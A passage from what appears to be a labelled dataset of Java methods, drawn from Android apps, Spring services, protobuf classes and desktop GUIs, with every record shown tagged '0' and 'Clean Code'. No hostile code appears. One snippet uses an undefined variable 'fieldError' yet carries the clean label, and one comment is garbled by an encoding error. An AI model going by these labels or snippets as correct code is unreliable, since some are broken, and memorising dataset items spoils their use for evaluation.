  MediaScannerConnection.scanFile(context,targetDirs.toArray(new String[0]),null,(ignore,ignore2) -> Log.d(TAG,""MediaStore cache refreshed""));
}",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.protos.core.MinimumCardinalityDatasetProto)) {
    return super.equals(obj);
  }
  org.tribuo.protos.core.MinimumCardinalityDatasetProto other=(org.tribuo.protos.core.MinimumCardinalityDatasetProto)obj;
  if (hasMetadata() != other.hasMetadata())   return false;
  if (hasMetadata()) {
    if (!getMetadata().equals(other.getMetadata()))     return false;
  }
  if (!getExamplesList().equals(other.getExamplesList()))   return false;
  if (getDropInvalidExamples() != other.getDropInvalidExamples())   return false;
  if (getMinCardinality() != other.getMinCardinality())   return false;
  if (getNumExamplesRemoved() != other.getNumExamplesRemoved())   return false;
  if (!getRemovedList().equals(other.getRemovedList()))   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"@Override public List<HrmAchievementEmployeeSeg> queryAppraisalSeg(Integer employeeAppraisalId){
  List<HrmAchievementEmployeeSeg> hrmAchievementEmployeeSegList=lambdaQuery().eq(HrmAchievementEmployeeSeg::getEmployeeAppraisalId,employeeAppraisalId).orderByAsc(HrmAchievementEmployeeSeg::getSort).list();
  hrmAchievementEmployeeSegList.forEach(employeeSeg -> {
    List<HrmAchievementEmployeeSegItem> employeeSegItems=employeeSegItemService.lambdaQuery().eq(HrmAchievementEmployeeSegItem::getSegId,employeeSeg.getSegId()).orderByAsc(HrmAchievementEmployeeSegItem::getSort).list();
    employeeSeg.setItems(employeeSegItems);
    List<HrmAchievementEmployeeEvaluatoSeg> evaluatoSegList=employeeEvaluatoSegService.lambdaQuery().eq(HrmAchievementEmployeeEvaluatoSeg::getSegId,employeeSeg.getSegId()).eq(HrmAchievementEmployeeEvaluatoSeg::getEmployeeAppraisalId,employeeAppraisalId).orderByAsc(HrmAchievementEmployeeEvaluatoSeg::getUpdateTime).list();
    evaluatoSegList.forEach(evaluatoSeg -> {
      String employeeName=employeeService.lambdaQuery().select(HrmEmployee::getEmployeeName).eq(HrmEmployee::getEmployeeId,evaluatoSeg.getEmployeeId()).last(""limit 1"").one().getEmployeeName();
      evaluatoSeg.setEmployeeName(employeeName);
    }
);
    employeeSeg.setEvaluatoSegList(evaluatoSegList);
  }
);
  return hrmAchievementEmployeeSegList;
}",0,Clean Code
"private void scheduleNextDateUpdate(){
  try {
    AlarmManager alarmManager=SystemUtils.AlarmManager();
    Calendar alarmTime=Calendar.getInstance();
    alarmTime.set(Calendar.HOUR_OF_DAY,0);
    alarmTime.set(Calendar.MINUTE,0);
    alarmTime.add(Calendar.DATE,1);
    alarmManager.set(AlarmManager.RTC,alarmTime.getTimeInMillis(),"""",() -> {
      scheduleNextDateUpdate();
      if (hasDate) {
        informCallbacks();
      }
    }
,null);
  }
 catch (  Throwable t) {
    if (BuildConfig.DEBUG) {
      log(""Error setting formatted string update schedule"");
      log(t);
    }
  }
}",0,Clean Code
"/** 
 * 设置群成员允许名单，当设置群全局禁言时，仅群主/群管理/运行名单成员可以发言，仅专业版支持
 * @param groupId
 * @param isSet
 * @param memberIds
 * @param lines
 * @param notifyMsg
 * @param callback
 */
public void allowGroupMember(String groupId,boolean isSet,List<String> memberIds,List<Integer> lines,MessageContent notifyMsg,final GeneralCallback callback){
  if (!checkRemoteService()) {
    if (callback != null)     callback.onFail(ErrorCode.SERVICE_DIED);
    return;
  }
  if (TextUtils.isEmpty(groupId)) {
    Log.e(TAG,""Error, group id is null"");
    if (callback != null)     callback.onFail(-1);
    return;
  }
  int[] inlines=new int[lines.size()];
  for (int j=0; j < lines.size(); j++) {
    inlines[j]=lines.get(j);
  }
  try {
    mClient.muteOrAllowGroupMember(groupId,isSet,memberIds,true,inlines,content2Payload(notifyMsg),new cn.wildfirechat.client.IGeneralCallback.Stub(){
      @Override public void onSuccess() throws RemoteException {
        if (callback != null) {
          mainHandler.post(() -> callback.onSuccess());
        }
      }
      @Override public void onFailure(      final int errorCode) throws RemoteException {
        if (callback != null) {
          mainHandler.post(() -> callback.onFail(errorCode));
        }
      }
    }
);
  }
 catch (  RemoteException e) {
    e.printStackTrace();
    if (callback != null) {
      mainHandler.post(() -> callback.onFail(ErrorCode.SERVICE_EXCEPTION));
    }
  }
}",0,Clean Code
"/** 
 * trigger job
 * @param jobId
 * @param triggerType
 * @param failRetryCount        >=0: use this param<0: use param from job info config
 * @param executorShardingParam
 * @param executorParam         null: use job paramnot null: cover job param
 */
public static void trigger(int jobId,TriggerTypeEnum triggerType,int failRetryCount,String executorShardingParam,String executorParam){
  JobInfo jobInfo=JobAdminConfig.getAdminConfig().getJobInfoMapper().loadById(jobId);
  if (jobInfo == null) {
    logger.warn("">>>>>>>>>>>> trigger fail, jobId invalid，jobId={}"",jobId);
    return;
  }
  if (GlueTypeEnum.BEAN.getDesc().equals(jobInfo.getGlueType())) {
    String json=JSONUtils.changeJson(jobInfo.getJobJson(),JSONUtils.decrypt);
    jobInfo.setJobJson(json);
  }
  if (StringUtils.isNotBlank(executorParam)) {
    jobInfo.setExecutorParam(executorParam);
  }
  int finalFailRetryCount=failRetryCount >= 0 ? failRetryCount : jobInfo.getExecutorFailRetryCount();
  JobGroup group=JobAdminConfig.getAdminConfig().getJobGroupMapper().load(jobInfo.getJobGroup());
  int[] shardingParam=null;
  if (executorShardingParam != null) {
    String[] shardingArr=executorShardingParam.split(""/"");
    if (shardingArr.length == 2 && isNumeric(shardingArr[0]) && isNumeric(shardingArr[1])) {
      shardingParam=new int[2];
      shardingParam[0]=Integer.valueOf(shardingArr[0]);
      shardingParam[1]=Integer.valueOf(shardingArr[1]);
    }
  }
  if (ExecutorRouteStrategyEnum.SHARDING_BROADCAST == ExecutorRouteStrategyEnum.match(jobInfo.getExecutorRouteStrategy(),null) && group.getRegistryList() != null && !group.getRegistryList().isEmpty() && shardingParam == null) {
    for (int i=0; i < group.getRegistryList().size(); i++) {
      processTrigger(group,jobInfo,finalFailRetryCount,triggerType,i,group.getRegistryList().size());
    }
  }
 else {
    if (shardingParam == null) {
      shardingParam=new int[]{0,1};
    }
    processTrigger(group,jobInfo,finalFailRetryCount,triggerType,shardingParam[0],shardingParam[1]);
  }
}",0,Clean Code
"public static void moveToWindowScreen(Window currentWindow,Dialog<?> dialog){
  Window newWindow=dialog.getDialogPane().getScene().getWindow();
  DialogPane dialogPane=dialog.getDialogPane();
  double dialogWidth=dialogPane.getPrefWidth() > 0.0 ? dialogPane.getPrefWidth() : (dialogPane.getWidth() > 0.0 ? dialogPane.getWidth() : 360);
  double dialogHeight=dialogPane.getPrefHeight() > 0.0 ? dialogPane.getPrefHeight() : (dialogPane.getHeight() > 0.0 ? dialogPane.getHeight() : 200);
  moveToWindowScreen(currentWindow,newWindow,dialogWidth,dialogHeight);
}
public static void moveToWindowScreen(Window currentWindow,Window newWindow,double newWindowWidth,double newWindowHeight){
  Screen currentScreen=Screen.getScreens().stream().filter(screen -> screen.getVisualBounds().contains(currentWindow.getX(),currentWindow.getY())).findFirst().orElse(null);
  if (currentScreen != null && ((!Double.isNaN(newWindow.getX()) && !Double.isNaN(newWindow.getY())) || !Screen.getPrimary().getVisualBounds().contains(currentWindow.getX(),currentWindow.getY())) && !currentScreen.getVisualBounds().contains(newWindow.getX(),newWindow.getY())) {
    double x=currentWindow.getX() + (currentWindow.getWidth() / 2) - (newWindowWidth / 2);
    double y=currentWindow.getY() + (currentWindow.getHeight() / 2.2) - (newWindowHeight / 2);
    newWindow.setX(x);
    newWindow.setY(y);
  }
}",0,Clean Code
"public static StructGeneralAttribute createAttribute(String name){
  StructGeneralAttribute attr;
  if (ATTRIBUTE_INNER_CLASSES.getName().equals(name)) {
    attr=new StructInnerClassesAttribute();
  }
 else   if (ATTRIBUTE_CONSTANT_VALUE.getName().equals(name)) {
    attr=new StructConstantValueAttribute();
  }
 else   if (ATTRIBUTE_SIGNATURE.getName().equals(name)) {
    attr=new StructGenericSignatureAttribute();
  }
 else   if (ATTRIBUTE_ANNOTATION_DEFAULT.getName().equals(name)) {
    attr=new StructAnnDefaultAttribute();
  }
 else   if (ATTRIBUTE_EXCEPTIONS.getName().equals(name)) {
    attr=new StructExceptionsAttribute();
  }
 else   if (ATTRIBUTE_ENCLOSING_METHOD.getName().equals(name)) {
    attr=new StructEnclosingMethodAttribute();
  }
 else   if (ATTRIBUTE_RUNTIME_VISIBLE_ANNOTATIONS.getName().equals(name) || ATTRIBUTE_RUNTIME_INVISIBLE_ANNOTATIONS.getName().equals(name)) {
    attr=new StructAnnotationAttribute();
  }
 else   if (ATTRIBUTE_RUNTIME_VISIBLE_PARAMETER_ANNOTATIONS.getName().equals(name) || ATTRIBUTE_RUNTIME_INVISIBLE_PARAMETER_ANNOTATIONS.getName().equals(name)) {
    attr=new StructAnnotationParameterAttribute();
  }
 else   if (ATTRIBUTE_RUNTIME_VISIBLE_TYPE_ANNOTATIONS.getName().equals(name) || ATTRIBUTE_RUNTIME_INVISIBLE_TYPE_ANNOTATIONS.getName().equals(name)) {
    attr=new StructTypeAnnotationAttribute();
  }
 else   if (ATTRIBUTE_LOCAL_VARIABLE_TABLE.getName().equals(name)) {
    attr=new StructLocalVariableTableAttribute();
  }
 else   if (ATTRIBUTE_LOCAL_VARIABLE_TYPE_TABLE.getName().equals(name)) {
    attr=new StructLocalVariableTypeTableAttribute();
  }
 else   if (ATTRIBUTE_BOOTSTRAP_METHODS.getName().equals(name)) {
    attr=new StructBootstrapMethodsAttribute();
  }
 else   if (ATTRIBUTE_SYNTHETIC.getName().equals(name) || ATTRIBUTE_DEPRECATED.getName().equals(name)) {
    attr=new StructGeneralAttribute();
  }
 else   if (ATTRIBUTE_LINE_NUMBER_TABLE.getName().equals(name)) {
    attr=new StructLineNumberTableAttribute();
  }
 else   if (ATTRIBUTE_METHOD_PARAMETERS.getName().equals(name)) {
    attr=new StructMethodParametersAttribute();
  }
 else {
    return null;
  }
  attr.name=name;
  return attr;
}
",0,Clean Code
"@Override public boolean dispatchKeyEvent(KeyEvent event){
  if (event.getKeyCode() != KeyEvent.KEYCODE_BACK) {
    return super.dispatchKeyEvent(event);
  }
  if (event.getAction() == KeyEvent.ACTION_DOWN && event.getRepeatCount() == 0) {
    getKeyDispatcherState().startTracking(event,this);
    return true;
  }
 else   if (event.getAction() == KeyEvent.ACTION_UP) {
    getKeyDispatcherState().handleUpEvent(event);
    if (event.isTracking() && !event.isCanceled()) {
      if (onBackPressed()) {
        dismiss();
      }
      return true;
    }
  }
  return super.dispatchKeyEvent(event);
}",0,Clean Code
"@Override public boolean onMenuItemSelected(@NonNull MenuItem item){
  var itemId=item.getItemId();
  if (itemId == R.id.menu_save) {
    save();
    return true;
  }
 else   if (itemId == R.id.menu_word_wrap) {
    item.setChecked(!item.isChecked());
    App.getPreferences().edit().putBoolean(""enable_word_wrap"",item.isChecked()).apply();
    binding.viewPager.setUserInputEnabled(item.isChecked());
    adapter.refresh();
    return true;
  }
  if (optionsItemSelectListener != null) {
    return optionsItemSelectListener.onOptionsItemSelected(item);
  }
  return false;
}
",0,Clean Code
"/** 
 * Extract error message from BindingResult
 * @param result
 * @return
 */
public static String buildMessage(BindingResult result){
  List<ObjectError> errors=result.getAllErrors();
  if (CollectionUtils.isEmpty(errors)) {
    return null;
  }
  int index=1;
  StringBuilder msg=new StringBuilder();
  msg.append(I18nUtils.getMessage(""common.paramCheckError""));
  for (  ObjectError e : errors) {
    msg.append(index++);
    msg.append(SymbolConstant.DOT);
    if (e instanceof FieldError) {
      msg.append(fieldError.getField());
      msg.append("" : "");
    }
    msg.append(e.getDefaultMessage());
    msg.append(SymbolConstant.SEMICOLON);
  }
  return msg.toString();
}",0,Clean Code
"private void promptPin(){
  Hwi.PromptPinService promptPinService=new Hwi.PromptPinService(device);
  promptPinService.setOnSucceeded(workerStateEvent -> {
    Boolean result=promptPinService.getValue();
    if (result) {
      setContent(getPinEntry());
      setExpanded(true);
    }
 else {
      setError(""Could not request PIN"",null);
      unlockButton.setDisable(false);
    }
  }
);
  promptPinService.setOnFailed(workerStateEvent -> {
    setError(""Error"",promptPinService.getException().getMessage());
    unlockButton.setDisable(false);
  }
);
  promptPinService.start();
}
",0,Clean Code
"@SuppressLint(""MutatingSharedPrefs"") public static @NonNull Set<String> getStringSet(SharedPreferences p,String key){
  Set<String> rv=null;
  try {
    rv=p.getStringSet(key,null);
  }
 catch (  ClassCastException e) {
    String s=p.getString(key,"""");
    if (!s.isEmpty()) {
      rv=new HashSet<>();
      rv.add(s);
    }
  }
  if (rv == null)   rv=new HashSet<>();
  return rv;
}
",0,Clean Code
"@Override public String signature(@Nullable Object type){
  if (type == null || type instanceof JavaType.Unknown) {
    return ""{undefined}"";
  }
  if (type instanceof JavaType.Class) {
    return classSignature(type);
  }
 else   if (type instanceof JavaType.Array) {
    return arraySignature(type);
  }
 else   if (type instanceof JavaType.Parameterized) {
    return parameterizedSignature(type);
  }
 else   if (type instanceof JavaType.GenericTypeVariable) {
    return genericSignature(type);
  }
 else   if (type instanceof JavaType.Primitive) {
    return primitiveSignature(type);
  }
 else   if (type instanceof JavaType.Method) {
    return methodSignature((JavaType.Method)type);
  }
 else   if (type instanceof JavaType.Variable) {
    return variableSignature((JavaType.Variable)type);
  }
 else   if (type instanceof JavaType.Intersection) {
    return intersectionSignature(type);
  }
  throw new UnsupportedOperationException(""Unexpected type "" + type.getClass().getName());
}
",0,Clean Code
"/** 
 * Get the resulting x-position of the right edge of the crop window given the handle's position and the image's bounding box and snap radius.
 * @param right the position that the right edge is dragged to
 * @param bounds the bounding box of the image that is being cropped
 * @param viewWidth
 * @param snapMargin the snap distance to the image edge (in pixels)
 */
private void adjustRight(RectF rect,float right,RectF bounds,int viewWidth,float snapMargin,float aspectRatio,boolean topMoves,boolean bottomMoves){
  float newRight=right;
  if (newRight > viewWidth) {
    newRight=viewWidth + (newRight - viewWidth) / 1.05f;
    mTouchOffset.x-=(newRight - viewWidth) / 1.1f;
  }
  if (newRight > bounds.right) {
    mTouchOffset.x-=(newRight - bounds.right) / 2f;
  }
  if (bounds.right - newRight < snapMargin) {
    newRight=bounds.right;
  }
  if (newRight - rect.left < mMinCropWidth) {
    newRight=rect.left + mMinCropWidth;
  }
  if (newRight - rect.left > mMaxCropWidth) {
    newRight=rect.left + mMaxCropWidth;
  }
  if (bounds.right - newRight < snapMargin) {
    newRight=bounds.right;
  }
  if (aspectRatio > 0) {
    float newHeight=(newRight - rect.left) / aspectRatio;
    if (newHeight < mMinCropHeight) {
      newRight=Math.min(bounds.right,rect.left + mMinCropHeight * aspectRatio);
      newHeight=(newRight - rect.left) / aspectRatio;
    }
    if (newHeight > mMaxCropHeight) {
      newRight=Math.min(bounds.right,rect.left + mMaxCropHeight * aspectRatio);
      newHeight=(newRight - rect.left) / aspectRatio;
    }
    if (topMoves && bottomMoves) {
      newRight=Math.min(newRight,Math.min(bounds.right,rect.left + bounds.height() * aspectRatio));
    }
 else {
      if (topMoves && rect.bottom - newHeight < bounds.top) {
        newRight=Math.min(bounds.right,rect.left + (rect.bottom - bounds.top) * aspectRatio);
        newHeight=(newRight - rect.left) / aspectRatio;
      }
      if (bottomMoves && rect.top + newHeight > bounds.bottom) {
        newRight=Math.min(newRight,Math.min(bounds.right,rect.left + (bounds.bottom - rect.top) * aspectRatio));
      }
    }
  }
  rect.right=newRight;
}",0,Clean Code
"@Override public void onCreateMenu(@NonNull Menu menu,MenuInflater inflater){
  inflater.inflate(R.menu.firewall_menu,menu);
  mMenu=menu;
  mToggle=(SwitchCompat)menu.findItem(R.id.toggle_btn).getActionView();
  mToggle.setOnCheckedChangeListener((buttonView,isChecked) -> {
    if (isChecked == Prefs.isFirewallEnabled(requireContext(),mPrefs))     return;
    Log.d(TAG,""Firwall is now "" + (isChecked ? ""enabled"" : ""disabled""));
    CaptureService.setFirewallEnabled(isChecked);
    mPrefs.edit().putBoolean(Prefs.PREF_FIREWALL,isChecked).apply();
    updateStatus();
  }
);
  menu.findItem(R.id.whitelist_mode).setChecked(Prefs.isFirewallWhitelistMode(mPrefs));
  menu.findItem(R.id.block_new_apps).setChecked(Prefs.blockNewApps(mPrefs));
  reloadMode(false);
}
",0,Clean Code
"private void applyLookAndFeel(String lafClassName,IntelliJTheme theme,String nameForProperties,Properties properties,boolean pack){
  EventQueue.invokeLater(() -> {
    try {
      Font defaultFont=null;
      if (UIManager.getLookAndFeel() instanceof FlatLaf) {
        Font font=UIManager.getFont(""defaultFont"");
        if (font != UIManager.getLookAndFeelDefaults().getFont(""defaultFont""))         defaultFont=font;
      }
      UIManager.put(""defaultFont"",null);
      if (theme != null)       UIManager.setLookAndFeel(IntelliJTheme.createLaf(theme));
 else       if (properties != null)       UIManager.setLookAndFeel(new FlatPropertiesLaf(nameForProperties,properties));
 else       UIManager.setLookAndFeel(lafClassName);
      if (defaultFont != null && UIManager.getLookAndFeel() instanceof FlatLaf)       UIManager.put(""defaultFont"",defaultFont);
      updateUI2();
      if (pack)       pack();
 else {
        int width=getWidth();
        int height=getHeight();
        Dimension prefSize=getPreferredSize();
        if (prefSize.width > width || prefSize.height > height)         setSize(Math.max(prefSize.width,width),Math.max(prefSize.height,height));
      }
      Rectangle screenBounds=getGraphicsConfiguration().getBounds();
      screenBounds=FlatUIUtils.subtractInsets(screenBounds,getToolkit().getScreenInsets(getGraphicsConfiguration()));
      Dimension frameSize=getSize();
      if (frameSize.width > screenBounds.width || frameSize.height > screenBounds.height)       setSize(Math.min(frameSize.width,screenBounds.width),Math.min(frameSize.height,screenBounds.height));
      if (getX() + getWidth() > screenBounds.x + screenBounds.width || getY() + getHeight() > screenBounds.y + screenBounds.height) {
        setLocation(Math.min(getX(),screenBounds.x + screenBounds.width - getWidth()),Math.min(getY(),screenBounds.y + screenBounds.height - getHeight()));
      }
      if (inspector != null)       inspector.update();
    }
 catch (    Exception ex) {
      ex.printStackTrace();
    }
  }
);
}",0,Clean Code
"@java.lang.Override public int hashCode(){
  if (memoizedHashCode != 0) {
    return memoizedHashCode;
  }
  int hash=41;
  hash=(19 * hash) + getDescriptor().hashCode();
  if (hasParam()) {
    hash=(37 * hash) + PARAM_FIELD_NUMBER;
    hash=(53 * hash) + getParam().hashCode();
  }
  hash=(37 * hash) + NR_CLASS_FIELD_NUMBER;
  hash=(53 * hash) + getNrClass();
  hash=(37 * hash) + L_FIELD_NUMBER;
  hash=(53 * hash) + getL();
  if (getSVCount() > 0) {
    hash=(37 * hash) + SV_FIELD_NUMBER;
    hash=(53 * hash) + getSVList().hashCode();
  }
  if (getSvCoefLengthsCount() > 0) {
    hash=(37 * hash) + SV_COEF_LENGTHS_FIELD_NUMBER;
    hash=(53 * hash) + getSvCoefLengthsList().hashCode();
  }
  if (getSvCoefCount() > 0) {
    hash=(37 * hash) + SV_COEF_FIELD_NUMBER;
    hash=(53 * hash) + getSvCoefList().hashCode();
  }
  if (getRhoCount() > 0) {
    hash=(37 * hash) + RHO_FIELD_NUMBER;
    hash=(53 * hash) + getRhoList().hashCode();
  }
  if (getProbACount() > 0) {
    hash=(37 * hash) + PROBA_FIELD_NUMBER;
    hash=(53 * hash) + getProbAList().hashCode();
  }
  if (getProbBCount() > 0) {
    hash=(37 * hash) + PROBB_FIELD_NUMBER;
    hash=(53 * hash) + getProbBList().hashCode();
  }
  if (getSvIndicesCount() > 0) {
    hash=(37 * hash) + SV_INDICES_FIELD_NUMBER;
    hash=(53 * hash) + getSvIndicesList().hashCode();
  }
  if (getLabelCount() > 0) {
    hash=(37 * hash) + LABEL_FIELD_NUMBER;
    hash=(53 * hash) + getLabelList().hashCode();
  }
  if (getNSVCount() > 0) {
    hash=(37 * hash) + NSV_FIELD_NUMBER;
    hash=(53 * hash) + getNSVList().hashCode();
  }
  hash=(29 * hash) + unknownFields.hashCode();
  memoizedHashCode=hash;
  return hash;
}",0,Clean Code
"public static void addURIHandlers(){
  try {
    if (Desktop.isDesktopSupported()) {
      if (Desktop.getDesktop().isSupported(Desktop.Action.APP_OPEN_FILE)) {
        Desktop.getDesktop().setOpenFileHandler(openFilesHandler);
      }
      if (Desktop.getDesktop().isSupported(Desktop.Action.APP_OPEN_URI)) {
        Desktop.getDesktop().setOpenURIHandler(openURIHandler);
      }
    }
  }
 catch (  Exception e) {
    log.error(""Could not add URI handler"",e);
  }
}
",0,Clean Code
"public double getDuration(){
  if (attributeDuration > 0) {
    return attributeDuration;
  }
  TLRPC.Document document=getDocument();
  if (document == null && type == TYPE_STORY) {
    TL_stories.StoryItem storyItem=getMedia(messageOwner).storyItem;
    if (storyItem != null && storyItem.media != null) {
      document=storyItem.media.document;
    }
  }
  if (document == null) {
    return 0;
  }
  if (audioPlayerDuration > 0) {
    return audioPlayerDuration;
  }
  for (int a=0; a < document.attributes.size(); a++) {
    TLRPC.DocumentAttribute attribute=document.attributes.get(a);
    if (attribute instanceof TLRPC.TL_documentAttributeAudio) {
      return attributeDuration=attribute.duration;
    }
 else     if (attribute instanceof TLRPC.TL_documentAttributeVideo) {
      return attributeDuration=attribute.duration;
    }
  }
  return audioPlayerDuration;
}",0,Clean Code
"private void getImage(Uri uri,final CountDownLatch latch,final ImageDownloadListener listener){
  ImagePipeline imagePipeline=Fresco.getImagePipeline();
  ImageRequest request=ImageRequestBuilder.newBuilderWithSource(uri).build();
  DataSource<CloseableReference<CloseableImage>> dataSource=imagePipeline.fetchDecodedImage(request,mContext);
  DataSubscriber<CloseableReference<CloseableImage>> dataSubscriber=new BaseDataSubscriber<CloseableReference<CloseableImage>>(){
    @Override protected void onNewResultImpl(    DataSource<CloseableReference<CloseableImage>> dataSource){
      if (!dataSource.isFinished()) {
        return;
      }
      if (listener != null && !listener.isValid()) {
        return;
      }
      CloseableReference<CloseableImage> result=dataSource.getResult();
      CloseableImage image=result.get();
      Log.d(""[ImageDownloader.onNewResultImpl]"",image.getClass().toString());
      if (image instanceof BaseCloseableStaticBitmap) {
        Bitmap bitmap=((BaseCloseableStaticBitmap)image).getUnderlyingBitmap();
        if (listener != null) {
          listener.completed(bitmap.copy(mConfig,true));
        }
 else {
          Bitmap temp=bitmap.copy(mConfig,true);
          if (temp != null) {
            mImageMap.put(latch,temp);
          }
        }
      }
      result.close();
      dataSource.close();
      if (latch != null) {
        latch.countDown();
      }
    }
    @Override protected void onFailureImpl(    DataSource<CloseableReference<CloseableImage>> dataSource){
      if (latch != null) {
        latch.countDown();
      }
      Throwable t=dataSource.getFailureCause();
      if (listener != null) {
        listener.failed(t.getMessage());
      }
    }
  }
;
  dataSource.subscribe(dataSubscriber,mExecutorSupplier.forBackgroundTasks());
}
",0,Clean Code
"private void sendPhotosGroup(ArrayList<MediaController.PhotoEntry> entries,boolean notify,int scheduleDate,boolean forceDocument){
  if (!entries.isEmpty()) {
    ArrayList<SendMessagesHelper.SendingMediaInfo> photos=new ArrayList<>();
    for (    MediaController.PhotoEntry entry : entries) {
      SendMessagesHelper.SendingMediaInfo info=new SendMessagesHelper.SendingMediaInfo();
      if (!entry.isVideo && entry.imagePath != null) {
        info.path=entry.imagePath;
      }
 else       if (entry.path != null) {
        info.path=entry.path;
      }
      info.thumbPath=entry.thumbPath;
      info.isVideo=entry.isVideo;
      info.caption=entry.caption != null ? entry.caption.toString() : null;
      info.entities=entry.entities;
      info.masks=entry.stickers;
      info.ttl=entry.ttl;
      info.videoEditedInfo=entry.editedInfo;
      info.canDeleteAfter=entry.canDeleteAfter;
      info.hasMediaSpoilers=entry.hasSpoiler;
      photos.add(info);
      entry.reset();
    }
    fillEditingMediaWithCaption(photos.get(0).caption,photos.get(0).entities);
    SendMessagesHelper.prepareSendingMedia(getAccountInstance(),photos,dialog_id,replyingMessageObject,getThreadMessage(),null,replyingQuote,forceDocument,true,null,notify,scheduleDate,chatMode,photos.get(0).updateStickersOrder,null,quickReplyShortcut,getQuickReplyId());
    afterMessageSend();
    if (chatActivityEnterView != null) {
      chatActivityEnterView.setFieldText("""");
    }
  }
  if (scheduleDate != 0) {
    if (scheduledMessagesCount == -1) {
      scheduledMessagesCount=0;
    }
    scheduledMessagesCount+=entries.size();
    updateScheduledInterface(true);
  }
}",0,Clean Code
"/** 
 * 椤圭洰鍚姩鏃讹紝鍒濆鍖栧畾鏃跺櫒
 */
@PostConstruct public void init(){
  List<ScheduleJob> scheduleJobList=getJobList();
  for (  ScheduleJob scheduleJob : scheduleJobList) {
    CronTrigger cronTrigger=ScheduleUtils.getCronTrigger(scheduler,scheduleJob.getJobId());
    if (cronTrigger == null) {
      ScheduleUtils.createScheduleJob(scheduler,scheduleJob);
    }
 else {
      ScheduleUtils.updateScheduleJob(scheduler,scheduleJob);
    }
  }
}
",0,Clean Code
"/** 
 * Navigates notifications.
 * @param context the specified context
 */
public void navigateNotifications(final RequestContext context){
  final JSONObject currentUser=Sessions.getUser();
  if (null == currentUser) {
    context.sendError(403);
    return;
  }
  final String userId=currentUser.optString(Keys.OBJECT_ID);
  final int unreadCommentedNotificationCnt=notificationQueryService.getUnreadNotificationCountByType(userId,Notification.DATA_TYPE_C_COMMENTED);
  if (unreadCommentedNotificationCnt > 0) {
    context.sendRedirect(Latkes.getServePath() + ""/notifications/commented"");
    return;
  }
  final int unreadReplyNotificationCnt=notificationQueryService.getUnreadNotificationCountByType(userId,Notification.DATA_TYPE_C_REPLY);
  if (unreadReplyNotificationCnt > 0) {
    context.sendRedirect(Latkes.getServePath() + ""/notifications/reply"");
    return;
  }
  final int unreadAtNotificationCnt=notificationQueryService.getUnreadNotificationCountByType(userId,Notification.DATA_TYPE_C_AT) + notificationQueryService.getUnreadNotificationCountByType(userId,Notification.DATA_TYPE_C_ARTICLE_NEW_FOLLOWER) + notificationQueryService.getUnreadNotificationCountByType(userId,Notification.DATA_TYPE_C_ARTICLE_NEW_WATCHER)+ notificationQueryService.getUnreadNotificationCountByType(userId,Notification.DATA_TYPE_C_COMMENT_VOTE_UP)+ notificationQueryService.getUnreadNotificationCountByType(userId,Notification.DATA_TYPE_C_COMMENT_VOTE_DOWN)+ notificationQueryService.getUnreadNotificationCountByType(userId,Notification.DATA_TYPE_C_ARTICLE_VOTE_UP)+ notificationQueryService.getUnreadNotificationCountByType(userId,Notification.DATA_TYPE_C_ARTICLE_VOTE_DOWN);
  if (unreadAtNotificationCnt > 0) {
    context.sendRedirect(Latkes.getServePath() + ""/notifications/at"");
    return;
  }
  final int unreadPointNotificationCnt=notificationQueryService.getUnreadPointNotificationCount(userId);
  if (unreadPointNotificationCnt > 0) {
    context.sendRedirect(Latkes.getServePath() + ""/notifications/point"");
    return;
  }
  final int unreadFollowingNotificationCnt=notificationQueryService.getUnreadFollowingNotificationCount(userId);
  if (unreadFollowingNotificationCnt > 0) {
    context.sendRedirect(Latkes.getServePath() + ""/notifications/following"");
    return;
  }
  final int unreadBroadcastCnt=notificationQueryService.getUnreadNotificationCountByType(userId,Notification.DATA_TYPE_C_BROADCAST);
  if (unreadBroadcastCnt > 0) {
    context.sendRedirect(Latkes.getServePath() + ""/notifications/broadcast"");
    return;
  }
  final int unreadSysAnnounceCnt=notificationQueryService.getUnreadSysAnnounceNotificationCount(userId);
  if (unreadSysAnnounceCnt > 0) {
    context.sendRedirect(Latkes.getServePath() + ""/notifications/sys-announce"");
    return;
  }
  context.sendRedirect(Latkes.getServePath() + ""/notifications/commented"");
}",0,Clean Code
"public HashMap<String,List<String>> flush() throws IOException {
  AtomicReference<String> errMsg=new AtomicReference<>();
  AtomicReference<Integer> lenResult=new AtomicReference<>();
  IntegerCallback nativeIntegerCallback=new IntegerCallback((len,err) -> {
    if (len < 0 && err != null) {
      errMsg.set(err);
    }
    lenResult.set(len);
  }
,intReferenceManager);
  nativeIntegerCallback.registerReferenceKey();
  Pointer ptrResult=libLakeSoulIO.flush_and_close_writer(writer,nativeIntegerCallback);
  writer=null;
  if (errMsg.get() != null && !errMsg.get().isEmpty()) {
    throw new IOException(""Native writer flush failed with error: "" + errMsg.get());
  }
  Integer len=lenResult.get();
  if (len != null && len > 0) {
    int lenWithTail=len + 1;
    Pointer buffer=fixedBuffer;
    if (lenWithTail > fixedBuffer.size()) {
      if (lenWithTail > mutableBuffer.size()) {
        mutableBuffer=Runtime.getRuntime(libLakeSoulIO).getMemoryManager().allocateDirect(lenWithTail);
      }
      buffer=mutableBuffer;
    }
    AtomicReference<Boolean> exported=new AtomicReference<>();
    BooleanCallback nativeBooleanCallback=new BooleanCallback((status,err) -> {
      if (!status && err != null) {
        errMsg.set(err);
      }
      exported.set(status);
    }
,boolReferenceManager);
    nativeBooleanCallback.registerReferenceKey();
    libLakeSoulIO.export_bytes_result(nativeBooleanCallback,ptrResult,len,buffer.address());
    if (exported.get() != null && exported.get()) {
      byte[] bytes=new byte[len];
      buffer.get(0,bytes,0,len);
      String decodedResult=new String(bytes);
      String[] splits=decodedResult.split(""\u0001"");
      int partitionNum=Integer.parseInt(splits[0]);
      if (partitionNum != splits.length - 1) {
        throw new IOException(""Dynamic Partitions Result ["" + decodedResult + ""] encode error: partition number mismatch ""+ partitionNum+ ""!=""+ (splits.length - 1));
      }
      HashMap<String,List<String>> partitionDescAndFilesMap=new HashMap<>();
      for (int i=1; i < splits.length; i++) {
        String[] partitionDescAndFiles=splits[i].split(""\u0002"");
        List<String> list=new ArrayList<>(Arrays.asList(partitionDescAndFiles).subList(1,partitionDescAndFiles.length));
        partitionDescAndFilesMap.put(partitionDescAndFiles[0],list);
      }
      return partitionDescAndFilesMap;
    }
  }
  return null;
}",0,Clean Code
"public static List<MechanicalCrafterBlockEntity> getPrecedingCrafters(MechanicalCrafterBlockEntity crafter){
  BlockPos pos=crafter.getBlockPos();
